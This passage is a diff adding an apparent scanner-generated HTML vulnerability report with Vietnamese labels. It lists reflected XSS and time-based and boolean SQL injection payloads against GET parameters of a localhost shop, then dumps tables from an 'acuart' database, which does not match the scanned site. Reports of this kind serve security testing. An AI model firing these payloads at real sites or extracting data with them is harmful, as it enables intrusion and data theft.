+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code> AND (SELECT 5 FROM PG_SLEEP(5))</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=14</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=29</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=16</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=5</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code> AND (SELECT 5 FROM PG_SLEEP(5))</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=12</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=21</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=23</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+<h2>Dữ liệu đã khai thác</h2><h3>Database: acuart</h3>
+<h4>Table: guestbook (1 rows)</h4>
+<table>
+<tr>
+<th>mesaj</th><th>sender</th><th>senttime</th></tr><tr></tr></table><br>
+<h4>Table: products (4 rows)</h4>
+<table>
+<tr>
+<th>id</th><th>price</th><th>name</th><th>rewritename</th><th>description</th></tr><tr><td>1</td><td>359</td><td>Network Storage D-Link DNS-313 enclosure 1 x SATA</td><td>network-attached-storage-dlink</td><td>NET STORAGE ENCLOSURE SATA DNS-313 D-LINK</td></tr><tr><td>2</td><td>10</td><td>Web Camera A4Tech PK-335E</td><td>web-camera-a4tech</td><td>Web Camera A4Tech PK-335E</td></tr><tr><td>3</td><td>812</td><td>Laser Color Printer HP LaserJet M551dn, A4</td><td>color-printer</td><td>Laser Color Printer HP LaserJet M551dn, A4</td></tr><tr></tr></table><br>
+<h4>Table: categ (5 rows)</h4>
+<table>
+<tr>
+<th>cat_id</th><th>cdesc</th><th>cname</th></tr><tr><td>1</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati</td><td>Posters</td></tr><tr><td>2</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati</td><td>Paintings</td></tr><tr><td>3</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati</td><td>Stickers</td></tr><tr><td>4</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati</td><td>Graffity</td></tr><tr></tr></table><br>
+<h4>Table: carts (4 rows)</h4>
+<table>
+<tr>
+<th>cart_id</th><th>item</th><th>price</th></tr><tr><td>2a8bad9c33b30d84b464ae4470a0a11e</td><td>2</td><td>800</td></tr><tr><td>2a8bad9c33b30d84b464ae4470a0a11e</td><td>3</td><td>986</td></tr><tr><td>2a8bad9c33b30d84b464ae4470a0a11e</td><td>1</td><td>500</td></tr><tr></tr></table><br>
+<h4>Table: pictures (8 rows)</h4>
+<table>
+<tr>
+<th>a_id</th><th>cat_id</th><th>pic_id</th><th>img</th><th>plong</th><th>price</th><th>title</th><th>pshort</th></tr><tr><td>1</td><td>1</td><td>1</td><td>./pictures/1.jpg</td><td>&lt;p&gt;\nThis picture is an 53 cm x 12 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>500</td><td>The shore</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu.</td></tr><tr><td>1</td><td>1</td><td>2</td><td>./pictures/2.jpg</td><td>&lt;p&gt;\nThis picture is an 53 cm x 12 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>800</td><td>Mistery</td><td>Donec molestie.\nSed aliquam sem ut arcu.</td></tr><tr><td>1</td><td>1</td><td>3</td><td>./pictures/3.jpg</td><td>&lt;p&gt;\nThis picture is an 53 cm x 12 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>986</td><td>The universe</td><td>Lorem ipsum dolor sit amet. Donec molestie.\nSed aliquam sem ut arcu.</td></tr><tr><td>1</td><td>1</td><td>4</td><td>./pictures/4.jpg</td><td>&lt;p&gt;\nThis picture is an 53 cm x 12 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>1000</td><td>Walking</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n</td></tr><tr><td>1</td><td>1</td><td>5</td><td>./pictures/5.jpg</td><td>&lt;p&gt;\nThis picture is an 53 cm x 12 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>460</td><td>Mean</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</td></tr><tr><td>1</td><td>2</td><td>6</td><td>./pictures/6.jpg</td><td>&lt;p&gt;\nThis picture is an 99 cm x 200 cm masterpiece.\n&lt;/p&gt;\n&lt;p&gt;\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n&lt;/p&gt;</td><td>10000</td><td>Thing</td><td>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n</td></tr><tr><td>2</td><td>1</td><td>7</td><td>./pictures/7.jpg</td><td>bla bla bla long</td><td>15000</td><td>Trees</td><td>bla bla bla</td></tr><tr></tr></table><br>
+<h4>Table: artists (4 rows)</h4>
+<table>
+<tr>
+<th>artist_id</th><th>adesc</th><th>aname</th></tr><tr><td>1</td><td>&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;\n&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;</td><td>r4w8173</td></tr><tr><td>2</td><td>&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n&lt;/p&gt;\n&lt;p&gt;\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. 